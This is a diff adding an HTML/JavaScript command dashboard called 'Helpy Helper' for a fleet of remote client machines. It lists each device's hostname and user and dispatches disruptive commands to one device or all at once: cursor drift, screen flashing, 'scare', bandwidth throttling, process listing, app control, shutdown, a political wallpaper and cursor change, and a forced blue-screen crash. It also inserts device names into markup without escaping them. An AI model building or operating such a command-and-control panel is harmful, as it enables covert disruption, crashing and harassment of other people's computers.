@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Helpy Helper — Device Hub</title>
+  <style>
+    :root { color-scheme: dark; font-family: "Segoe UI", system-ui, sans-serif; }
+    body { margin: 0; background: #0f1115; color: #e8eaed; }
+    header { padding: 20px 24px; border-bottom: 1px solid #2a2f3a; background: #151922; }
+    main { padding: 24px; max-width: 1100px; margin: 0 auto; display: grid; gap: 20px; }
+    h1 { margin: 0 0 6px; font-size: 1.5rem; }
+    .sub { color: #9aa0a6; font-size: 0.95rem; }
+    section { background: #151922; border: 1px solid #2a2f3a; border-radius: 10px; padding: 16px; }
+    h2 { margin: 0 0 12px; font-size: 1.1rem; }
+    input, select, button, textarea { font: inherit; padding: 8px 10px; border-radius: 6px; border: 1px solid #3c4454; background: #0f1115; color: #e8eaed; }
+    button { cursor: pointer; background: #2b59c3; border-color: #3d6fd8; }
+    button.secondary { background: #2a2f3a; border-color: #3c4454; }
+    button.danger { background: #8b1e1e; border-color: #c62828; }
+    .row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 10px; }
+    table { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
+    th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid #2a2f3a; }
+    .online { color: #4caf50; font-weight: 600; }
+    .offline { color: #888; }
+    .warn { background: #3a2200; border: 1px solid #aa7700; padding: 10px; border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; }
+    .danger-box { background: #3a0000; border: 2px solid #c62828; padding: 10px; border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; }
+    pre { background: #0a0c10; padding: 12px; border-radius: 6px; overflow: auto; max-height: 220px; font-size: 0.85rem; }
+    label { display: flex; flex-direction: column; gap: 4px; font-size: 0.85rem; color: #9aa0a6; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Helpy Helper</h1>
+    <p class="sub">Railway device hub — list online Ozioscar clients and dispatch global or device-specific commands.</p>
+  </header>
+  <main>
+    <section>
+      <h2>Connection</h2>
+      <div class="row">
+        <label style="flex:1">API key (HELPY_API_KEY)
+          <input id="apiKey" type="password" placeholder="Bearer token" />
+        </label>
+        <button onclick="saveKey()">Save</button>
+        <button class="secondary" onclick="refreshDevices()">Refresh devices</button>
+      </div>
+      <p class="sub" id="status">Not connected</p>
+    </section>
+
+    <section>
+      <h2>Devices</h2>
+      <table>
+        <thead>
+          <tr><th>Status</th><th>Hostname</th><th>User</th><th>Device ID</th><th>Last seen</th><th></th></tr>
+        </thead>
+        <tbody id="deviceRows"><tr><td colspan="6">Loading…</td></tr></tbody>
+      </table>
+    </section>
+
+    <section>
+      <h2>Send command</h2>
+      <div class="row">
+        <label>Target
+          <select id="target"><option value="all">All devices (global)</option></select>
+        </label>
+        <label>Action
+          <select id="action">
+            <option value="drift/start">Drift — start</option>
+            <option value="drift/stop">Drift — stop</option>
+            <option value="flash/start">Flash — start</option>
+            <option value="flash/stop">Flash — stop</option>
+            <option value="scare">Scare</option>
+            <option value="rate">Rate limit (MB/s)</option>
+            <option value="whoopsie/start">Whoopsie — start</option>
+            <option value="whoopsie/stop">Whoopsie — stop</option>
+            <option value="open">Open app</option>
+            <option value="close">Close app</option>
+            <option value="list-processes">List processes</option>
+            <option value="shutdown">Shutdown</option>
+            <option value="israel">Israel (cursor/wallpaper)</option>
+            <option value="remove">Remove startup</option>
+            <option value="bsod">BSOD (CRASH)</option>
+          </select>
+        </label>
+      </div>
+      <div class="row" id="payloadFields"></div>
+      <div class="danger-box" id="bsodWarn" hidden>
+        <strong>BSOD WILL CRASH TARGET PC(s).</strong> Requires confirm text and all ack flags in payload.
+      </div>
+      <button onclick="sendCommand()">Dispatch</button>
+      <pre id="sendLog"></pre>
+    </section>
+
+    <section>
+      <h2>Recent commands</h2>
+      <button class="secondary" onclick="refreshCommands()">Refresh</button>
+      <pre id="commandLog">—</pre>
+    </section>
+  </main>
+  <script>
+    const KEY_STORAGE = "helpy_api_key";
+    let selectedDevice = "all";
+
+    document.getElementById("apiKey").value = localStorage.getItem(KEY_STORAGE) || "";
+    document.getElementById("action").addEventListener("change", renderPayloadFields);
+    renderPayloadFields();
+
+    function saveKey() {
+      localStorage.setItem(KEY_STORAGE, document.getElementById("apiKey").value.trim());
+      refreshDevices();
+    }
+
+    function headers() {
+      const h = { "Content-Type": "application/json" };
+      const key = document.getElementById("apiKey").value.trim();
+      if (key) h.Authorization = "Bearer " + key;
+      return h;
+    }
+
+    async function api(path, opts = {}) {
+      const res = await fetch(path, { ...opts, headers: { ...headers(), ...(opts.headers || {}) } });
+      const data = await res.json().catch(() => ({}));
+      if (!res.ok) throw new Error(data.error || res.statusText);
+      return data;
+    }
+
+    function fmtAgo(ms) {
+      if (ms < 1000) return "just now";
+      if (ms < 60000) return Math.round(ms / 1000) + "s ago";
+      return Math.round(ms / 60000) + "m ago";
+    }
+
+    async function refreshDevices() {
+      try {
+        const data = await api("/api/devices");
+        document.getElementById("status").textContent = `${data.devices.filter(d => d.online).length} online / ${data.devices.length} registered`;
+        const tbody = document.getElementById("deviceRows");
+        const target = document.getElementById("target");
+        target.innerHTML = '<option value="all">All devices (global)</option>';
+        tbody.innerHTML = data.devices.map(d => {
+          target.innerHTML += `<option value="${d.id}">${d.hostname} (${d.user})</option>`;
+          return `<tr>
+            <td class="${d.online ? "online" : "offline"}">${d.online ? "ONLINE" : "offline"}</td>
+            <td>${esc(d.hostname)}</td>
+            <td>${esc(d.user)}</td>
+            <td><code>${esc(d.id.slice(0,8))}…</code></td>
+            <td>${fmtAgo(d.lastSeenAgo)}</td>
+            <td><button class="secondary" onclick="pickDevice('${d.id}')">Select</button></td>
+          </tr>`;
+        }).join("") || '<tr><td colspan="6">No devices yet — run theapp on a client.</td></tr>';
+        target.value = selectedDevice;
+      } catch (e) {
+        document.getElementById("status").textContent = "Error: " + e.message;
+      }
+    }
+
+    function pickDevice(id) {
+      selectedDevice = id;
+      document.getElementById("target").value = id;
+    }
+
+    function esc(s) {
+      return String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;" }[c]));
+    }
+
+    function renderPayloadFields() {
+      const action = document.getElementById("action").value;
+      const box = document.getElementById("payloadFields");
+      document.getElementById("bsodWarn").hidden = action !== "bsod";
+      const templates = {
+        "drift/start": `<label>Direction<select id="p_direction"><option>right</option><option>left</option><option>up</option><option>down</option></select></label><label>Speed<input id="p_speed" type="number" value="2" min="1" max="20"/></label>`,
+        "rate": `<label>MB/s (0 = remove)<input id="p_mbs" type="number" value="5" min="0"/></label>`,
+        "open": `<label>App<input id="p_app" placeholder="notepad.exe"/></label>`,
+        "close": `<label>App<input id="p_app" placeholder="notepad.exe"/></label>`,
+        "shutdown": `<label>Confirm text<input id="p_confirm" placeholder="CONFIRM SHUTDOWN"/></label>`,
+        "israel": `<label>Confirm text<input id="p_confirm" placeholder="CONFIRM ISRAEL"/></label>`,
+        "remove": `<label>Confirm text<input id="p_confirm" placeholder="REMOVE STARTUP"/></label>`,
+        "bsod": `<label><input type="checkbox" id="p_ackCrash"/> ackCrash</label><label><input type="checkbox" id="p_ackAdmin"/> ackAdmin</label><label><input type="checkbox" id="p_ackDataLoss"/> ackDataLoss</label><label>Confirm<input id="p_confirm" placeholder="CRASH MY PC"/></label>`,
+      };
+      box.innerHTML = templates[action] || '<span class="sub">No extra payload</span>';
+    }
+
+    function buildPayload() {
+      const action = document.getElementById("action").value;
+      const p = {};
+      const g = id => document.getElementById(id);
+      if (action === "drift/start") { p.direction = g("p_direction")?.value || "right"; p.speed = Number(g("p_speed")?.value || 2); }
+      if (action === "rate") p.mbs = Number(g("p_mbs")?.value || 0);
+      if (action === "open" || action === "close") p.app = g("p_app")?.value || "";
+      if (["shutdown","israel","remove"].includes(action)) p.confirm = g("p_confirm")?.value || "";
+      if (action === "bsod") {
+        p.ackCrash = g("p_ackCrash")?.checked || false;
+        p.ackAdmin = g("p_ackAdmin")?.checked || false;
+        p.ackDataLoss = g("p_ackDataLoss")?.checked || false;
+        p.confirm = g("p_confirm")?.value || "";
+      }
+      return p;
+    }
+
+    async function sendCommand() {
+      const target = document.getElementById("target").value;
+      const action = document.getElementById("action").value;
+      const payload = buildPayload();
+      try {
+        const data = await api("/api/commands", {
+          method: "POST",
+          body: JSON.stringify({ target, action, payload })
+        });
+        document.getElementById("sendLog").textContent = JSON.stringify(data, null, 2);
+        refreshCommands();
+      } catch (e) {
+        document.getElementById("sendLog").textContent = "Error: " + e.message;
+      }
+    }
+
+    async function refreshCommands() {
+      try {
+        const data = await api("/api/commands?limit=30");
+        document.getElementById("commandLog").textContent = JSON.stringify(data.commands, null, 2);
+      } catch (e) {
+        document.getElementById("commandLog").textContent = "Error: " + e.message;
+      }
+    }
+
+    refreshDevices();
+    refreshCommands();
+    setInterval(refreshDevices, 10000);
+    setInterval(refreshCommands, 15000);
+  </script>
+</body>
+</html>
